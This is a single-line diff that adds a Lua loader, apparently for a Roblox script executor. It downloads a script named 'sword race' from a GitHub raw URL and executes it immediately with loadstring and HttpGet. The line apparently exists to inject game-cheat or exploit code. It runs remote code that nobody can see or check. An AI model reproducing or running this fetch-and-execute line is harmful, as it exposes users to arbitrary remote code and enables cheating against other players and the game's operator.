@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PerfectusMim/PerfectusMim/main/sword%20race"))()
